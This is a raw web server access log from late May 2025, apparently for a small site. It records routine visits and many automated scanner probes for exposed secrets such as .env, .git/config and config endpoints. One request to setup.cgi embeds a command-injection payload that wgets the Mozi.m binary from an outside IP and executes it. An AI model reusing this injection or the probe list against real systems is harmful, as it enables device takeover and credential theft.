142.93.228.172 - - [27/May/2025:04:43:00 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.228.172 - - [27/May/2025:04:43:01 +0000] "GET /1.php HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
142.93.228.172 - - [27/May/2025:04:43:01 +0000] "GET /systembc/password.php HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
204.76.203.206 - - [27/May/2025:04:43:26 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.242.226.115 - - [27/May/2025:04:52:05 +0000] "\x16\x03\x01\x00\x89\x01\x00\x00\x85\x03\x03bl\xAB\xAE\x87\x89B\x19|B\x8E\x04\xCC\x93kJ\xDEP\x9D\xA7\xA0;I\xBD\xCDb\x05u7\xF8\xED\xAF\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
185.218.86.52 - - [27/May/2025:04:53:19 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
176.65.149.188 - - [27/May/2025:04:59:22 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
152.53.248.175 - - [27/May/2025:05:05:55 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 157 "-" "-"
79.124.58.198 - - [27/May/2025:05:11:25 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
176.65.149.163 - - [27/May/2025:05:16:16 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
68.69.186.42 - - [27/May/2025:05:25:09 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 157 "-" "-"
78.153.140.93 - - [27/May/2025:05:26:52 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [27/May/2025:05:26:52 +0000] "POST / HTTP/1.1" 405 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
79.124.58.198 - - [27/May/2025:05:45:31 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
204.76.203.212 - - [27/May/2025:05:50:30 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [27/May/2025:05:52:36 +0000] "GET / HTTP/1.0" 200 47 "-" "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
185.218.84.7 - - [27/May/2025:05:55:41 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
20.65.192.33 - - [27/May/2025:05:55:54 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 zgrab/0.x"
68.183.91.199 - - [27/May/2025:06:12:03 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
68.183.91.199 - - [27/May/2025:06:12:04 +0000] "GET /.git/config HTTP/1.1" 404 207 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
147.185.132.162 - - [27/May/2025:06:22:02 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xF6\x85\xDE\x19\xFC\x16\xF8+\xFF\xFBq\xC2kbg40Me\xE2J\x99KhrMu\xD4\x13\xEE\xB0" 400 157 "-" "-"
147.185.132.162 - - [27/May/2025:06:22:02 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA5\xFANP\x1FA\x89\xF6Hx2\xAC/\xD5\xB5\xF3\x80\xD0\x19\xD5\xC5\x116" 400 157 "-" "-"
79.124.58.198 - - [27/May/2025:06:22:30 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
68.69.186.106 - - [27/May/2025:06:31:35 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 157 "-" "-"
222.142.143.146 - - [27/May/2025:06:35:33 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.142.143.146:45036/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 207 "-" "-"
78.153.140.93 - - [27/May/2025:06:38:41 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [27/May/2025:06:38:41 +0000] "POST / HTTP/1.1" 405 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
204.76.203.206 - - [27/May/2025:06:44:43 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
122.173.31.207 - - [27/May/2025:06:48:59 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.207 - - [27/May/2025:06:49:00 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "http://logwise.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
43.157.188.74 - - [27/May/2025:06:50:52 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
122.173.31.207 - - [27/May/2025:06:52:18 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [27/May/2025:06:52:18 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [27/May/2025:06:52:19 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "http://logwise.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [27/May/2025:07:09:05 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.207 - - [27/May/2025:07:09:09 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.207 - - [27/May/2025:07:09:10 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.207 - - [27/May/2025:07:09:10 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.207 - - [27/May/2025:07:09:10 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.207 - - [27/May/2025:07:09:10 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.207 - - [27/May/2025:07:09:11 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.207 - - [27/May/2025:07:09:11 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.207 - - [27/May/2025:07:09:11 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.207 - - [27/May/2025:07:09:11 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
79.124.58.198 - - [27/May/2025:07:14:08 +0000] "GET /console/ HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.184.76.172 - - [27/May/2025:07:15:11 +0000] "\x16\x03\x03\x01\xA4\x01\x00\x01\xA0\x03\x03`\xCB\xA0\x831\xBF\xB3s8\x16\xF8\xC1\xB4\xF0\x10\xF1\xDA,\xD0\x99" 400 157 "-" "-"
195.184.76.170 - - [27/May/2025:07:15:14 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
176.65.149.188 - - [27/May/2025:07:24:22 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
152.53.248.175 - - [27/May/2025:07:25:33 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 157 "-" "-"
195.184.76.37 - - [27/May/2025:07:28:07 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
43.159.143.187 - - [27/May/2025:07:37:07 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.218.86.52 - - [27/May/2025:07:43:35 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.236.228.245 - - [27/May/2025:07:46:31 +0000] "\x16\x03\x01\x01" 400 157 "-" "-"
172.236.228.245 - - [27/May/2025:07:46:32 +0000] "\x16\x03\x01\x01" 400 157 "-" "-"
78.153.140.93 - - [27/May/2025:08:02:11 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [27/May/2025:08:02:12 +0000] "POST / HTTP/1.1" 405 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
79.124.58.198 - - [27/May/2025:08:03:51 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
122.173.31.207 - - [27/May/2025:08:08:04 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [27/May/2025:08:08:05 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [27/May/2025:08:08:05 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "http://smartlog.tech/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [27/May/2025:08:09:39 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
122.173.31.207 - - [27/May/2025:08:09:39 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "http://smartlog.tech/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
122.173.31.207 - - [27/May/2025:08:15:42 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "http://smartlog.tech/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
204.76.203.212 - - [27/May/2025:08:24:16 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
79.124.58.198 - - [27/May/2025:08:30:03 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
204.76.203.206 - - [27/May/2025:08:37:38 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
20.163.39.86 - - [27/May/2025:08:42:18 +0000] "GET /druid/index.html HTTP/1.1" 404 207 "-" "Mozilla/5.0 zgrab/0.x"
185.218.84.7 - - [27/May/2025:08:57:14 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
79.124.58.198 - - [27/May/2025:09:24:27 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
205.210.31.9 - - [27/May/2025:09:24:45 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03t\xE6\x81\xFC=d\xBD\xE3v\x22\x0B\xBC\xAB\xCE:\xFA\x1D9\xCE\x8Fw\x8E\xCC\x00\xB5s9\xF7\xD2\x90\x19\x82 \xED\x90Rm\xF6\x17q\x99\x17'\x93\xFE\x00\xA9\xB2\x9A\x1D\x11#\xFD" 400 157 "-" "-"
205.210.31.9 - - [27/May/2025:09:24:46 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03fe\xFE\xF3\xE9\xE8\xE4a\xAE\xC8M;\x90\xD7\xCD\x11\x8EUK\x83G\x81\xA1\x90^\x15\x9D?G\xAB\xF1N\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
122.173.31.207 - - [27/May/2025:09:28:42 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [27/May/2025:09:28:42 +0000] "GET /favicon.ico HTTP/1.1" 499 0 "http://smartlog.tech/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [27/May/2025:09:29:21 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
79.124.58.198 - - [27/May/2025:09:38:43 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
78.153.140.93 - - [27/May/2025:09:48:39 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [27/May/2025:09:48:39 +0000] "POST / HTTP/1.1" 405 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.183.209.244 - - [27/May/2025:09:52:03 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
122.173.31.207 - - [28/May/2025:11:46:39 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:11:46:39 +0000] "GET /favicon.ico HTTP/1.1" 499 0 "http://smartlog.tech/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:11:47:04 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:11:47:05 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:11:47:05 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "http://www.smartlog.tech/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
51.75.162.18 - - [28/May/2025:11:47:20 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
167.99.210.137 - - [28/May/2025:11:50:32 +0000] "\x16\x03\x01\x01\x00\x01\x00\x00\xFC\x03\x03\xF3\xD5\x94\x04\xDE\x02\xA8\x13\x19\xD0\xD9\x93\xBA{\xEC5\xA2\xDE\xD9\xA3\x93{\xA00\xCB\xBC\x911\xABk\x82\x85 \xE4\xD7\xE6P\xA4h7Y\xEAC\xB5Z\xA0\x16o\xE1'\x03@7\xD6q\x92C\xFC\x9D^)\x96*\x15;\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
164.90.228.79 - - [28/May/2025:11:50:32 +0000] "\x16\x03\x01\x01\x04\x01\x00\x01\x00\x03\x03:U\x86wNyi\x9BJ#_,\x8Fv\x0F&\xA4\xE5\xEE\xAC=~\xF6\xE0Z\xE1\x91\xE0\xBF\x9E\x0B\xE4 or0--2N9G\xBC\xDE\xBDbT\x81\xBE\x87\xD3\xFF\x19r\x87\xDD\xAD\x1A\xD0\xA7\xE3v8\xD7?\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
167.99.210.137 - - [28/May/2025:11:50:33 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
164.90.228.79 - - [28/May/2025:11:50:33 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
167.99.210.137 - - [28/May/2025:11:50:33 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA42636) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.3357.98 Mobile Safari/537.3"
164.90.228.79 - - [28/May/2025:11:50:33 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA42636) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.3357.98 Mobile Safari/537.3"
167.99.210.137 - - [28/May/2025:11:50:33 +0000] "GET /@vite/env HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:33 +0000] "GET /@vite/env HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:34 +0000] "GET /actuator/env HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:34 +0000] "GET /actuator/env HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:34 +0000] "GET /server HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:34 +0000] "GET /server HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:34 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:34 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:35 +0000] "GET /about HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:35 +0000] "GET /about HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:35 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:35 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:36 +0000] "GET /v2/_catalog HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:36 +0000] "GET /v2/_catalog HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:36 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:36 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:36 +0000] "GET /server-status HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:36 +0000] "GET /server-status HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:37 +0000] "GET /login.action HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:37 +0000] "GET /login.action HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:37 +0000] "GET /_all_dbs HTTP/1.1" 404 207 "-" "Mozilla/5.0 (l9scan/2.0.6363e2934323e223e20323; +https://leakix.net)"
167.99.210.137 - - [28/May/2025:11:50:37 +0000] "GET /_all_dbs HTTP/1.1" 404 207 "-" "Mozilla/5.0 (l9scan/2.0.6363e2934323e223e20323; +https://leakix.net)"
164.90.228.79 - - [28/May/2025:11:50:37 +0000] "GET /.DS_Store HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:37 +0000] "GET /.DS_Store HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:38 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:38 +0000] "GET /.env HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:38 +0000] "GET /.git/config HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:38 +0000] "GET /.git/config HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:39 +0000] "GET /s/6363e2934323e223e20323/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:39 +0000] "GET /s/6363e2934323e223e20323/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:39 +0000] "GET /config.json HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:39 +0000] "GET /config.json HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:39 +0000] "GET /telescope/requests HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:39 +0000] "GET /telescope/requests HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:40 +0000] "GET /info.php HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:40 +0000] "GET /info.php HTTP/1.1" 404 207 "-" "Go-http-client/1.1"
164.90.228.79 - - [28/May/2025:11:50:40 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 200 47 "-" "Go-http-client/1.1"
167.99.210.137 - - [28/May/2025:11:50:40 +0000] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 200 47 "-" "Go-http-client/1.1"
122.173.31.207 - - [28/May/2025:11:55:28 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:11:55:29 +0000] "GET /favicon.ico HTTP/1.1" 499 0 "http://www.smartlog.tech/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:11:55:58 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:11:55:58 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "http://www.smartlog.tech/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:07:31 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:07:32 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:07:32 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "https://www.smartlog.tech/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
193.142.132.33 - - [28/May/2025:12:07:36 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/116.0.5845.177 Mobile/15E148 Safari/604.1"
